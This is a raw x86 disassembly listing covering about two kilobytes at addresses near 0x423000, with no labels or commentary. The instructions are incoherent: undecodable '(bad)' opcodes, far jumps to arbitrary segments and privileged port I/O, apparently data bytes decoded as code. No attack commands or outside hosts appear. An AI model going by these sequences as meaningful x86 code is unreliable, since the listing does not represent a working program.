  42333d:	and    BYTE PTR [eax-0x404051c1],cl
  423343:	xor    DWORD PTR [ebx-0x326d7643],edx
  423349:	adc    bl,bl
  42334b:	jmp    0x285:0x1ad8e
  423352:	add    BYTE PTR [eax],al
  423354:	aas    
  423355:	xor    dl,BYTE PTR [ebp-0x5cf07f2a]
  42335b:	ret    0x8670
  42335e:	jecxz  0x4233b2
  423360:	repz xor BYTE PTR [edi+edi*8-0x3fcc37e0],0x80
  423369:	popa   
  42336a:	stos   DWORD PTR es:[edi],eax
  42336b:	adc    al,0xeb
  42336d:	neg    ecx
  42336f:	sub    eax,DWORD PTR [edx]
  423371:	dec    edx
  423373:	add    BYTE PTR ds:0x4d325c2e,dh
  423379:	mov    al,ds:0xbc1e3e6e
  42337e:	daa    
  42337f:	jns    0x42333d
  423381:	push   0xffffffde
  423383:	mov    bl,0x75
  423385:	(bad)  
  423386:	loope  0x42335d
  423388:	das    
  423389:	mov    bh,0x1f
  42338b:	jl     0x423354
  42338d:	cmp    DWORD PTR [edi+0x58],eax
  423390:	(bad)  
  423392:	std    
  423393:	sahf   
  423394:	stc    
  423395:	and    DWORD PTR [edi+eiz*4-0x100e84d0],0x4a
  42339d:	(bad)  
  42339e:	xor    al,0xb9
  4233a0:	jecxz  0x4233d3
  4233a2:	pusha  
  4233a3:	add    bh,BYTE PTR [eax+0x26efc174]
  4233a9:	mov    WORD PTR [esi],cs
  4233ab:	inc    edx
  4233ac:	sub    BYTE PTR [ebx-0x3],ch
  4233af:	stc    
  4233b0:	div    edi
  4233b2:	and    eax,0xddf6b829
  4233b7:	das    
  4233b8:	iret   
  4233b9:	cwde   
  4233ba:	jmp    0x301f:0x336826e9
  4233c1:	pop    ebx
  4233c2:	fst    st(0)
  4233c4:	ret    
  4233c5:	xchg   ebp,eax
  4233c6:	rcl    BYTE PTR [edi-0xa],cl
  4233c9:	hlt    
  4233ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233cb:	daa    
  4233cc:	(bad)  
  4233cd:	xor    DWORD PTR [ecx-0x42d713a5],edx
  4233d3:	scas   al,BYTE PTR es:[edi]
  4233d4:	pop    ecx
  4233d5:	jmp    0x3e4a:0xa715f49c
  4233dc:	dec    eax
  4233dd:	sbb    DWORD PTR [eax],ebx
  4233df:	enter  0xde8,0x40
  4233e3:	data16 lock shr BYTE PTR ds:0xcac96696,cl
  4233eb:	xchg   esi,eax
  4233ec:	(bad)  
  4233ed:	arpl   WORD PTR [edx+ebx*1],ax
  4233f0:	iret   
  4233f1:	push   0x5b0db33f
  4233f6:	xchg   ebp,eax
  4233f7:	xor    eax,0x5deef524
  4233fc:	sbb    ecx,DWORD PTR [eax-0x60]
  4233ff:	jne    0x423459
  423401:	in     al,dx
  423402:	aas    
  423403:	jle    0x4233fb
  423405:	retf   
  423406:	outs   dx,BYTE PTR ds:[esi]
  423407:	jbe    0x4233c6
  423409:	pop    edi
  42340a:	cmc    
  42340b:	mov    eax,ds:0x95ef4a04
  423410:	inc    edi
  423411:	cld    
  423412:	add    ebx,DWORD PTR [ecx+0x1d]
  423415:	fsubr  st(7),st
  423417:	jmp    0x42339d
  423419:	mov    DWORD PTR [ecx],0x4ce2bcd0
  42341f:	and    ebp,DWORD PTR [ecx]
  423421:	mov    esp,0x5ed162fb
  423426:	cmp    eax,0x5293da47
  42342b:	sar    dl,0x94
  42342e:	pop    ebp
  42342f:	aas    
  423430:	les    esi,FWORD PTR [esi]
  423432:	lods   eax,DWORD PTR ds:[esi]
  423433:	dec    edx
  423434:	mov    esi,0xef7155bc
  423439:	dec    eax
  42343a:	int    0x77
  42343c:	mov    DWORD PTR gs:[ecx+eax*8+0x11],ebp
  423441:	jmp    0xd4f2:0x127d7882
  423448:	(bad)  
  423449:	fisttp DWORD PTR [ebx]
  42344b:	jmp    0xec:0x64975a23
  423452:	and    eax,0x2a621b24
  423457:	bound  edi,QWORD PTR [edi-0x7715c8a9]
  42345d:	in     eax,0x45
  42345f:	xchg   ecx,eax
  423460:	dec    ebp
  423461:	rol    DWORD PTR [edi],1
  423463:	(bad)  
  423464:	leave  
  423465:	iret   
  423466:	adc    BYTE PTR [esi+0xc],al
  423469:	xor    eax,0xbd77939e
  42346e:	push   0x4b016914
  423473:	in     al,0xa0
  423475:	sbb    eax,0xdfba530e
  42347b:	and    esp,DWORD PTR [edx+0x41d5bfeb]
  423481:	es icebp 
  423483:	jo     0x423451
  423485:	arpl   WORD PTR [ebx],bp
  423487:	bound  esp,QWORD PTR [ecx-0x50763ac1]
  42348d:	aam    0xa
  42348f:	adc    edx,ebx
  423491:	xchg   ebp,eax
  423492:	scas   eax,DWORD PTR es:[edi]
  423493:	inc    esi
  423494:	in     eax,0x61
  423496:	jbe    0x423430
  423498:	adc    eax,0xd62d6933
  42349d:	push   cs
  42349e:	(bad)  [ecx+0x59]
  4234a1:	xchg   dl,al
  4234a3:	shr    BYTE PTR [esi],cl
  4234a5:	std    
  4234a6:	xor    al,0xc5
  4234a8:	mov    ebp,0xe2c497fb
  4234ad:	fwait
  4234ae:	adc    al,0x91
  4234b0:	call   0x9ac3:0x29a0edf6
  4234b7:	aad    0x2b
  4234b9:	push   edx
  4234ba:	and    eax,DWORD PTR [edi-0x22]
  4234bd:	pushf  
  4234be:	pop    edx
  4234bf:	cmp    al,0x30
  4234c1:	pop    esp
  4234c2:	pusha  
  4234c3:	inc    edx
  4234c4:	add    al,0x82
  4234c6:	mov    ebx,DWORD PTR [esi+esi*1-0x54]
  4234ca:	call   0x3549:0x682655b3
  4234d1:	int3   
  4234d2:	mov    ebp,0xe69ca935
  4234d7:	leave  
  4234d8:	fcom   DWORD PTR [ebx]
  4234da:	(bad)  
  4234db:	aaa    
  4234dc:	(bad)  
  4234dd:	fdiv   DWORD PTR [esi+esi*2+0x539c5589]
  4234e4:	add    eax,0x57170497
  4234e9:	cmp    ecx,DWORD PTR [ebp-0x5b]
  4234ec:	iret   
  4234ed:	aad    0x60
  4234ef:	sar    BYTE PTR ds:0xd88af214,cl
  4234f5:	lds    eax,FWORD PTR [ecx]
  4234f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234f8:	nop
  4234f9:	adc    DWORD PTR [ebx],ebx
  4234fb:	pop    ds
  4234fc:	(bad)  
  4234fd:	fcomi  st,st(2)
  4234ff:	push   ebp
  423500:	fild   QWORD PTR ds:0xda9a06c3
  423506:	sbb    DWORD PTR [ebx],ebp
  423508:	cmp    eax,0x40cbbfa5
  42350d:	stos   BYTE PTR es:[edi],al
  42350e:	push   cs
  42350f:	mov    cl,0x4
  423511:	push   ss
  423512:	test   al,0xa6
  423514:	outs   dx,BYTE PTR ds:[esi]
  423515:	popf   
  423516:	ret    
  423517:	adc    BYTE PTR [ebp+0x78],0x92
  42351b:	push   esp
  42351c:	dec    ebp
  42351d:	mov    ah,BYTE PTR [edi-0x3f]
  423520:	push   esp
  423521:	dec    ecx
  423522:	jge    0x423539
  423524:	imul   ebx,DWORD PTR [ecx+0x19c06e30],0xd92413c0
  42352e:	inc    ebx
  42352f:	loop   0x423525
  423531:	adc    al,0x77
  423533:	cmp    DWORD PTR [eax-0x14bcc7ff],ecx
  423539:	or     ecx,DWORD PTR [eax+0x1c]
  42353c:	adc    al,0xa5
  42353e:	ja     0x42350e
  423540:	xor    edi,DWORD PTR [esi+0x5727cb2b]
  423546:	lds    eax,FWORD PTR [ecx]
  423548:	xchg   ecx,eax
  423549:	test   eax,0x1d755ae3
  42354e:	sub    BYTE PTR [esi+0x338c0690],bh
  423554:	in     al,dx
  423555:	inc    edi
  423556:	sub    BYTE PTR [ebx+eax*8+0x15],bl
  42355a:	and    ah,cl
  42355c:	cli    
  42355d:	or     DWORD PTR [edi+0x74],ebp
  423560:	jle    0x4234f6
  423562:	ficom  WORD PTR [esi]
  423564:	lahf   
  423565:	stos   DWORD PTR es:[edi],eax
  423566:	sub    al,cl
  423568:	ins    DWORD PTR es:[edi],dx
  423569:	ds out 0x12,eax
  42356c:	mov    ss,WORD PTR [esi+0x20]
  42356f:	shl    ebx,0x8d
  423572:	hlt    
  423573:	jle    0x423550
  423575:	fild   WORD PTR [edx+0x58]
  423578:	or     bh,BYTE PTR [edi+0x14]
  42357b:	mov    ebp,0x5be4dd15
  423580:	cmp    DWORD PTR [edi],ebp
  423582:	pop    esi
  423583:	shr    BYTE PTR [ecx-0x37],1
  423586:	mov    DWORD PTR [eax],edi
  423588:	test   BYTE PTR [esi],dh
  42358a:	jecxz  0x4235c5
  42358c:	ins    DWORD PTR es:[edi],dx
  42358d:	and    eax,DWORD PTR [ebp+esi*4+0x64c60be1]
  423594:	pop    eax
  423595:	push   ds
  423596:	push   ecx
  423597:	js     0x4235dc
  423599:	sbb    al,0x62
  42359b:	addr16 test eax,0xdbded20d
  4235a1:	mov    eax,ds:0x46ac8cb5
  4235a6:	cmp    ebx,DWORD PTR [ebx+edi*2+0x351f365f]
  4235ad:	jne    0x42359b
  4235af:	aam    0x26
  4235b1:	sbb    BYTE PTR [eax+eiz*8+0x56561a9b],ah
  4235b8:	inc    ecx
  4235b9:	push   ds
  4235ba:	xchg   edx,eax
  4235bb:	xchg   edi,eax
  4235bc:	ror    BYTE PTR [ecx],0x98
  4235bf:	fadd   DWORD PTR [ebp+0x21]
  4235c2:	pop    eax
  4235c3:	jmp    0x79d34d39
  4235c8:	sbb    BYTE PTR [ebx-0x3b1cb8af],dl
  4235ce:	pushf  
  4235cf:	or     al,0xff
  4235d1:	or     BYTE PTR [esi-0x5e756a5f],ah
  4235d7:	(bad)
  4235da:	add    BYTE PTR [eax],al
  4235dc:	pop    esp
  4235dd:	mov    edi,0xdce35063
  4235e2:	jg     0x4235a3
  4235e4:	popa   
  4235e5:	hlt    
  4235e6:	mov    esi,0x44c52e1d
  4235eb:	rcl    BYTE PTR [ebx],cl
  4235ed:	mov    al,0x1
  4235ef:	add    BYTE PTR [ebp+0x2b000002],al
  4235f5:	shl    DWORD PTR [eax],0x8
  4235f8:	lods   eax,DWORD PTR ds:[esi]
  4235f9:	iret   
  4235fa:	imul   esp,ebx,0x512b8335
  423600:	in     eax,0x44
  423602:	jbe    0x4235ea
  423604:	xor    BYTE PTR [ecx+0x79386870],ch
  42360a:	leave  
  42360b:	int    0x0
  42360d:	int3   
  42360e:	or     al,0xa4
  423610:	sub    DWORD PTR [ebp+0x60],ebp
  423613:	xor    eax,0xfa27148e
  423618:	jmp    0xbfd9:0x21da7f37
  42361f:	mov    dh,0x68
  423621:	lahf   
  423622:	sar    DWORD PTR [ecx],1
  423624:	fisttp QWORD PTR [edi+0x6c]
  423627:	and    DWORD PTR ds:0xd890dd73,esi
  42362d:	adc    dh,0x60
  423630:	clc    
  423631:	push   ecx
  423632:	xor    BYTE PTR [ebx+0x3a],bl
  423635:	mov    ds:0x4cb7cad2,eax
  42363a:	ds push es
  42363c:	mov    esi,0x58d58659
  423641:	jg     0x423689
  423643:	ja     0x42369f
  423645:	ds imul esi,edx,0xffffff84
  423649:	cld    
  42364a:	fbstp  TBYTE PTR [ebx+0x4dad2b51]
  423650:	imul   eax,DWORD PTR [eax+0x5d4ce53f],0x40
  423657:	push   edx
  423658:	out    dx,eax
  423659:	idiv   DWORD PTR [edi]
  42365b:	imul   edx,esp,0xffffffd8
  42365e:	ja     0x423631
  423660:	(bad)  
  423662:	jb     0x4235f8
  423664:	xchg   esi,eax
  423665:	cdq    
  423666:	adc    ecx,DWORD PTR [edx-0x17]
  423669:	fisttp DWORD PTR [ebx]
  42366b:	mov    bl,BYTE PTR [esi-0x792decca]
  423671:	pop    ecx
  423672:	les    eax,FWORD PTR [edx+0x53]
  423675:	ins    DWORD PTR es:[edi],dx
  423676:	xchg   ecx,eax
  423677:	cld    
  423678:	mov    dh,0x5d
  42367a:	hlt    
  42367b:	lock pop eax
  42367d:	mov    ch,0xe3
  42367f:	jne    0x42368e
  423681:	repz fmul QWORD PTR [eax+0x418c99e6]
  423689:	sbb    esi,DWORD PTR [ebp-0x2aa39add]
  42368f:	ins    DWORD PTR es:[edi],dx
  423690:	test   DWORD PTR [ecx],esp
  423692:	xlat   BYTE PTR ds:[ebx]
  423693:	sbb    BYTE PTR [edx+0x35e5d58d],dl
  423699:	(bad)  
  42369b:	nop
  42369c:	sub    al,0xa7
  42369e:	mov    al,0x41
  4236a0:	stos   DWORD PTR es:[edi],eax
  4236a1:	cmp    eax,0x6c229f62
  4236a6:	mov    eax,DWORD PTR [esi-0xafdf948]
  4236ac:	loop   0x4236b9
  4236ae:	aam    0xcd
  4236b0:	mov    esi,0xa9ce538
  4236b5:	sub    DWORD PTR [ebp+0xe847276],0x6ede50a4
  4236bf:	les    esi,FWORD PTR [ebx]
  4236c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236c2:	or     BYTE PTR ds:[ebp-0x5aa1e8d9],al
  4236c9:	mov    eax,ds:0xc4d9c3af
  4236ce:	add    bl,ch
  4236d0:	cmp    eax,0xdb1e49d9
  4236d5:	ret    0x8f80
  4236d8:	xor    al,0x22
  4236da:	jnp    0x4236d7
  4236dc:	mov    ch,0x6e
  4236de:	shl    ch,cl
  4236e0:	into   
  4236e1:	shr    dh,0x56
  4236e4:	fstp   DWORD PTR ds:0xffab40de
  4236ea:	cmp    al,0x25
  4236ec:	and    DWORD PTR [ebp-0x5e5ae011],edx
  4236f2:	leave  
  4236f3:	fist   WORD PTR [ecx-0x2163c708]
  4236f9:	jp     0x423748
  4236fb:	div    BYTE PTR [edi]
  4236fd:	fcom   QWORD PTR [ebx+0x62f80a7f]
  423703:	sti    
  423704:	sbb    dl,0xd5
  423707:	dec    esi
  423708:	pop    ds
  423709:	or     al,0x64
  42370b:	jge    0x42374f
  42370d:	ins    DWORD PTR es:[edi],dx
  42370e:	enter  0x8738,0x46
  423712:	call   0x8116:0xed4b220
  423719:	mov    dh,0xa1
  42371b:	jnp    0x423705
  42371d:	push   es
  42371e:	aad    0x2a
  423720:	mov    ds:0xcbfbacc0,eax
  423725:	cdq    
  423726:	std    
  423727:	xor    eax,0xffffff81
  42372a:	jg     0x4236ef
  42372c:	inc    edx
  42372d:	fadd   QWORD PTR [ebx]
  42372f:	ficom  WORD PTR [eax-0x6d]
  423732:	push   ebp
  423733:	sbb    BYTE PTR [eax-0x2624ef61],0xfa
  42373a:	data16 mov WORD PTR [ebx-0x7730f768],fs
  423741:	dec    edi
  423742:	jb     0x4236ce
  423744:	test   DWORD PTR [edx-0x4d],esp
  423747:	sub    dl,dl
  423749:	inc    esi
  42374a:	inc    DWORD PTR [ebx-0x17]
  42374d:	push   esp
  42374e:	adc    al,0xbc
  423750:	cmp    ebp,edx
  423752:	data16 vpand ymm2,ymm7,YMMWORD PTR [eax-0x3a8274cf]
  42375b:	es add al,0x81
  42375e:	mov    dl,0xb7
  423760:	retf   
  423761:	aas    
  423762:	push   ds
  423763:	and    DWORD PTR [ebp-0x55],esp
  423766:	std    
  423767:	call   0xeddb:0x22040aaa
  42376e:	or     DWORD PTR fs:[ebx],ebp
  423771:	push   ss
  423772:	test   BYTE PTR [ebp+eiz*2+0x5a3a9bd8],ch
  423779:	inc    eax
  42377a:	xor    BYTE PTR [ecx],cl
  42377c:	aad    0xa3
  42377e:	mov    ?,ebp
  423780:	fisub  WORD PTR [ebx]
  423782:	push   ss
  423783:	shr    DWORD PTR [esi],0xe8
  423786:	add    DWORD PTR [edx-0x2313ceff],0xd41944c3
  423790:	xchg   edx,eax
  423791:	push   ebx
  423792:	fwait
  423793:	mov    bh,0xde
  423795:	push   esp
  423796:	dec    edx
  423797:	arpl   WORD PTR [ebx],sp
  423799:	push   esp
  42379a:	xchg   ebx,eax
  42379b:	pusha  
  42379c:	mov    BYTE PTR [eax],cl
  42379e:	ror    BYTE PTR [edx-0xcfd2ca5],cl
  4237a4:	jg     0x423738
  4237a6:	or     dh,dl
  4237a8:	mov    BYTE PTR [ecx-0x76],dh
  4237ab:	jae    0x423746
  4237ad:	cmp    al,0x0
  4237af:	mov    DWORD PTR [edx+0xa136a2c],esp
  4237b5:	inc    edi
  4237b6:	cmp    eax,0xa4b16279
  4237bb:	jge    0x423776
  4237bd:	push   cs
  4237be:	fcmovbe st,st(7)
  4237c0:	sbb    edi,DWORD PTR [eax+0x6d32bc93]
  4237c6:	aas    
  4237c7:	jmp    0x42380c
  4237c9:	xchg   ebx,eax
  4237ca:	or     eax,0x1cebbf7
  4237cf:	mov    esi,0xaf93093
  4237d4:	cmpps  xmm1,xmm0,0x45
  4237d8:	(bad)  
  4237d9:	int3   
  4237da:	push   ss
  4237db:	rol    esp,cl
  4237dd:	cmp    al,0xf1
  4237df:	push   ss
  4237e0:	cmp    BYTE PTR [edi],bl
  4237e2:	or     ch,BYTE PTR [ebx+ecx*1+0x192f27fd]
  4237e9:	(bad)  
  4237ea:	jecxz  0x423801
  4237ec:	cwde   
  4237ed:	int3   
  4237ee:	in     eax,0xc9
  4237f0:	sub    BYTE PTR [ebp+0xf],al
  4237f3:	std    
  4237f4:	iret   
  4237f5:	pop    es
  4237f6:	test   DWORD PTR [esi-0x7a],esi
  4237f9:	rcl    BYTE PTR [eax+0x79],0xdf
  4237fd:	int3   
  4237fe:	pop    ss
  4237ff:	and    ecx,DWORD PTR [ebx-0x2e]
  423802:	add    al,0xf2
  423804:	mov    al,0xd4
  423806:	xor    dl,ch
  423808:	sti    
  423809:	sti    
  42380a:	push   es
  42380b:	push   ebp
  42380c:	pushf  
  42380d:	stc    
  42380e:	into   
  42380f:	mov    ebx,0x33d48d38
  423814:	xchg   esp,eax
  423815:	sbb    dh,bl
  423817:	stos   BYTE PTR es:[edi],al
  423818:	rcl    DWORD PTR [esi],1
  42381a:	xlat   BYTE PTR ds:[ebx]
  42381b:	je     0x42387b
  42381d:	jp     0x42385f
  42381f:	test   al,0x39
  423821:	xor    DWORD PTR [ebx],ecx
  423823:	sbb    edi,DWORD PTR [eax+0x4d]
  423826:	push   ecx
  423827:	push   0x472a362a
  42382c:	adc    BYTE PTR [ecx+0x62373369],al
  423832:	mov    edx,0x66bb794e
  423837:	rol    esi,1
  423839:	sub    al,0xbb
  42383b:	xor    DWORD PTR [ebx+ebp*2],eax
  42383e:	add    al,0x9e
  423840:	mov    ds:0x39486209,al
  423845:	sbb    al,0x9e
  423847:	jp     0x4238ae
  423849:	fstp   DWORD PTR [ebx]
  42384b:	add    al,0x4b
  42384d:	push   edx
  42384e:	jno    0x423882
  423850:	sti    
  423851:	push   esp
  423852:	push   edx
  423853:	mov    edx,0x2fcf7d0d
  423858:	push   esp
  423859:	imul   ebx,DWORD PTR ds:0x1e823ed3,0x1bdb25eb
  423863:	pop    ebp
  423864:	scas   al,BYTE PTR es:[edi]
  423865:	lds    esi,FWORD PTR [edi-0x34]
  423868:	idiv   BYTE PTR [edx]
  42386a:	cli    
  42386b:	mov    ds:0xea7c6e43,al
  423870:	leave  
  423871:	out    0x2f,eax
  423873:	sub    eax,0x41f6f014
  423878:	repnz add BYTE PTR [eax],al
  42387b:	add    BYTE PTR [ebx+0x55],al
  42387e:	pusha  
  42387f:	(bad)  
  423880:	jbe    0x423841
  423882:	out    dx,eax
  423883:	fnstsw WORD PTR [edx-0x65bca93d]
  423889:	(bad)  
  42388a:	fidiv  WORD PTR [eax]
  42388c:	cwde   
  42388d:	mov    dl,0x1
  42388f:	add    BYTE PTR [ebp+0x2e000002],al
  423895:	mov    al,0x6d
  423897:	rcl    DWORD PTR [esi-0x9],1
  42389a:	aaa    
  42389b:	xlat   BYTE PTR ds:[ebx]
  42389c:	clc    
  42389d:	arpl   di,si
  42389f:	imul   esp,eax,0xffffffce
  4238a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238a3:	daa    
  4238a4:	into   
  4238a5:	mov    esp,0x129882c4
  4238aa:	and    al,0xf9
  4238ac:	and    eax,0xbdec1330
  4238b1:	(bad)  
  4238b2:	cmp    dl,BYTE PTR [ebx]
  4238b4:	pushf  
  4238b5:	pop    esi
  4238b6:	pop    eax
  4238b7:	inc    esi
  4238b8:	rcl    BYTE PTR [eax],0x36
  4238bb:	call   0x7efdc8af
  4238c0:	push   ecx
  4238c1:	inc    esi
  4238c2:	dec    ebx
  4238c3:	in     eax,dx
  4238c4:	mov    dh,0x2c
  4238c6:	dec    esi
  4238c7:	scas   eax,DWORD PTR es:[edi]
  4238c8:	sbb    al,0xd6
  4238ca:	fs mov cl,0x67
  4238cd:	sbb    eax,0xbd0ff1de
  4238d2:	fwait
  4238d3:	ja     0x4238d7
  4238d5:	mov    eax,0x433673e9
  4238da:	pop    ds
  4238db:	dec    edx
  4238dc:	adc    BYTE PTR [eax],0x7b
  4238df:	push   0x6258ad1f
  4238e4:	imul   eax,esp,0x2c9ae04a
  4238ea:	xlat   BYTE PTR ds:[ebx]
  4238eb:	lahf   
  4238ec:	pop    es
  4238ed:	fcom   DWORD PTR ds:0x7fbe662e
  4238f3:	shl    dh,1
  4238f5:	pop    ebx
  4238f6:	jl     0x423906
  4238f8:	scas   al,BYTE PTR es:[edi]
  4238f9:	push   0x873636e5
  4238fe:	xchg   edx,eax
  4238ff:	pop    eax
  423900:	inc    ebx
  423901:	stos   BYTE PTR es:[edi],al
  423902:	and    eax,0xc60207ee
  423907:	ret    0x1a95
  42390a:	call   0x97fc:0x9e09cb77
  423911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423912:	push   ebx
  423913:	lods   al,BYTE PTR ds:[esi]
  423914:	jg     0x4238b4
  423916:	mov    eax,ds:0xbd1e5395
  42391b:	test   al,0xae
  42391d:	mov    ds:0xa6808fcc,eax
  423922:	and    al,cl
  423924:	dec    ecx
  423925:	inc    esi
  423926:	pop    esp
  423927:	xlat   BYTE PTR ds:[ebx]
  423928:	fidiv  WORD PTR [ebp+0x7c4fb223]
  42392e:	cwde   
  42392f:	(bad)  
  423931:	jo     0x423986
  423933:	je     0x423995
  423935:	dec    edi
  423936:	mov    edx,0x42a7a5ac
  42393b:	mov    WORD PTR [ebp-0x40],ss
  42393e:	push   edx
  42393f:	cmp    cl,BYTE PTR [ecx]
  423941:	icebp  
  423942:	pop    ds
  423943:	dec    ebp
  423944:	cmp    esi,DWORD PTR [ebx-0x22]
  423947:	dec    edx
  423948:	in     eax,dx
  423949:	cmp    al,0x7
  42394b:	mov    esi,0xa08091f6
  423950:	jae    0x4239d1
  423952:	jne    0x4239bd
  423954:	xor    DWORD PTR [edi+0x64a7b132],0xc1c208fc
  42395e:	(bad)  
  42395f:	jp     0x423954
  423961:	add    DWORD PTR [edx+0x3990af15],0x7c
  423968:	jmp    0x4239dd
  42396a:	bound  esp,QWORD PTR [edi-0x24ca5cce]
  423970:	pop    DWORD PTR [edi]
  423972:	adc    al,0xfa
  423974:	adc    eax,0x22160cd0
  423979:	lods   al,BYTE PTR ds:[esi]
  42397a:	xor    esp,0x19c53458
  423980:	mov    edx,0xb8ef686e
  423985:	push   edx
  423986:	dec    ecx
  423987:	les    esp,FWORD PTR [edi-0x79]
  42398a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42398b:	jle    0x4239cf
  42398d:	aaa    
  42398e:	shl    BYTE PTR [esi-0x16],0x8e
  423992:	test   DWORD PTR [eax+0xe028718],0x32b0bfad
  42399c:	scas   eax,DWORD PTR es:[edi]
  42399d:	cmp    BYTE PTR [edi-0x48],ah
  4239a0:	inc    edi
  4239a1:	add    BYTE PTR [ecx-0x6e631898],cl
  4239a7:	or     BYTE PTR [ebx-0x7c0a26ad],bh
  4239ad:	mov    BYTE PTR [edx-0x56],dl
  4239b0:	aad    0xec
  4239b2:	out    dx,al
  4239b3:	(bad)  
  4239b4:	pushf  
  4239b5:	je     0x4239d3
  4239b7:	xchg   DWORD PTR [edi-0xf879e34],edx
  4239bd:	ja     0x42394a
  4239bf:	or     BYTE PTR [ecx+eiz*4+0x5d],al
  4239c3:	pop    edx
  4239c4:	sahf   
  4239c5:	sar    DWORD PTR [eax-0x5e],0x7f
  4239c9:	and    DWORD PTR [edi+0x1c],edi
  4239cc:	ret    
  4239cd:	sbb    esp,eax
  4239cf:	(bad)  
  4239d0:	out    0x7a,al
  4239d2:	stos   BYTE PTR es:[edi],al
  4239d3:	pop    ss
  4239d4:	popa   
  4239d5:	test   DWORD PTR [esi-0x449c7d5e],edi
  4239db:	retf   
  4239dc:	pop    ecx
  4239dd:	mov    cl,al
  4239df:	add    ebp,DWORD PTR [edi+0x31]
  4239e2:	enter  0x6313,0x29
  4239e6:	cdq    
  4239e7:	jnp    0x423999
  4239e9:	shl    BYTE PTR [ebp+0x6cdf6af5],1
  4239ef:	jns    0x4239ad
  4239f1:	mov    bh,0xb
  4239f3:	es pop edx
  4239f5:	sbb    ah,dl
  4239f7:	out    0x18,eax
  4239f9:	sbb    DWORD PTR [edi+0x61],ebp
  4239fc:	add    al,BYTE PTR [ebx+0x1734c592]
  423a02:	push   cs
  423a03:	mov    dh,0xd2
  423a05:	or     eax,0x413bbebf
  423a0a:	inc    edx
  423a0b:	sbb    al,0x58
  423a0d:	jle    0x4239af
  423a0f:	cmc    
  423a10:	inc    eax
  423a11:	outs   dx,BYTE PTR ds:[esi]
  423a12:	test   BYTE PTR [eax+0x7d0536a],dl
  423a18:	inc    edx
  423a19:	rcl    ecx,cl
  423a1b:	sub    dh,BYTE PTR [ebp-0x36]
  423a1e:	pop    eax
  423a1f:	and    esp,DWORD PTR [edx]
  423a21:	xchg   BYTE PTR [edx+0x47],ah
  423a24:	adc    esp,edi
  423a26:	inc    esp
  423a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a28:	test   WORD PTR [ecx],bx
  423a2b:	in     eax,dx
  423a2c:	popa   
  423a2d:	imul   ebp,DWORD PTR [edi-0x5f],0x72
  423a31:	sti    
  423a32:	push   edx
  423a33:	xor    al,0xfb
  423a35:	push   ss
  423a36:	adc    BYTE PTR [esi],0x32
  423a39:	pop    edi
  423a3a:	jmp    0xc4bd:0xc8b536aa
  423a41:	dec    eax
  423a42:	mov    bl,0xd9
  423a44:	outs   dx,BYTE PTR ds:[esi]
  423a45:	or     bh,BYTE PTR [eax+0x6d]
  423a48:	call   0x39f3:0x7b63bfce
  423a4f:	adc    DWORD PTR [edx],0x72
  423a52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a53:	iret   
  423a54:	and    eax,0xc8c2b55f
  423a59:	adc    eax,0xa8a9db79
  423a5e:	mov    ebp,0xa23e29c5
  423a63:	cmp    ebx,DWORD PTR [ebx+0x1f43b241]
  423a69:	sahf   
  423a6a:	fcomp  DWORD PTR [edx]
  423a6c:	hlt    
  423a6d:	rcr    BYTE PTR [ebx+0x21553e7e],0x3f
  423a74:	sbb    DWORD PTR [ecx-0x5b],0x8cc68091
  423a7b:	jl     0x423a69
  423a7d:	in     al,0x3b
  423a7f:	sub    al,0x45
  423a81:	jecxz  0x423a0b
  423a83:	fcomp  QWORD PTR [eax-0x20]
  423a86:	push   edi
  423a87:	leave  
  423a88:	push   eax
  423a89:	(bad)  
  423a8a:	cld    
  423a8b:	call   0x7c5a7f23
  423a90:	arpl   WORD PTR [ebx],bp
  423a92:	cmp    edx,esi
  423a94:	mov    ds:0x571e133e,al
  423a99:	xor    eax,0x51db2fe2
  423a9e:	out    0x94,eax
  423aa0:	mov    ebp,DWORD PTR [ecx+0x33]
  423aa3:	ins    BYTE PTR es:[edi],dx
  423aa4:	jbe    0x423a83
  423aa6:	pop    es
  423aa7:	push   cs
  423aa8:	sti    
  423aa9:	test   al,0xf5
  423aab:	ret    0xa418
  423aae:	push   0xcbeb3187
  423ab3:	inc    edx
  423ab4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ab5:	popa   
  423ab6:	and    BYTE PTR [edi-0x3c],cl
  423ab9:	sbb    BYTE PTR [edi],dh
  423abb:	out    0xb5,al
  423abd:	pop    ds
  423abe:	pop    es
  423abf:	rcl    DWORD PTR [edx+eiz*4],cl
  423ac2:	push   edi
  423ac3:	pop    edx
  423ac4:	add    al,0x5e
  423ac6:	jle    0x423b31
  423ac8:	dec    ebx
  423ac9:	idiv   eax
  423acb:	xor    eax,0xee0ffb5c
  423ad0:	inc    ebx
  423ad1:	fisttp WORD PTR [edx-0x5]
  423ad4:	loop   0x423a91
  423ad6:	xchg   edi,eax
  423ad7:	adc    dl,BYTE PTR [esi]
  423ad9:	jns    0x423a88
  423adb:	les    ecx,FWORD PTR [edx-0x41e3bf70]
  423ae1:	push   0x1bb4783d
  423ae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ae7:	cli    
  423ae8:	sbb    cl,0xbf
  423aeb:	push   esp
  423aec:	test   dl,dh
  423aee:	lock jmp 0xbbfe8676
  423af4:	xchg   ebx,eax
  423af5:	or     eax,0xe294d839
  423afa:	jecxz  0x423b50
  423afc:	test   eax,0x5aa3b345
  423b01:	xchg   DWORD PTR [ecx-0x5d889949],esi
  423b07:	mov    ah,0x65
  423b09:	in     al,0x63
  423b0b:	enter  0xc1f9,0xa2
  423b0f:	add    bl,BYTE PTR [edi-0x2f]
  423b12:	push   esp
  423b13:	das    
  423b14:	push   esp
  423b15:	add    ebx,ebp
  423b17:	jne    0x423aa0
  423b19:	add    BYTE PTR [eax],al
  423b1b:	add    BYTE PTR [edi+0x2d],dl
  423b1e:	pop    es
  423b1f:	call   0x55de:0xeddfba7f
  423b26:	inc    ecx
  423b27:	adc    al,0x1d
  423b29:	lods   al,BYTE PTR ds:[esi]
  423b2a:	add    BYTE PTR [ebx],0x1d
  423b2d:	mov    ch,0x1
  423b2f:	add    BYTE PTR [ebp+0x3c000002],al
  423b35:	lods   eax,DWORD PTR ds:[esi]
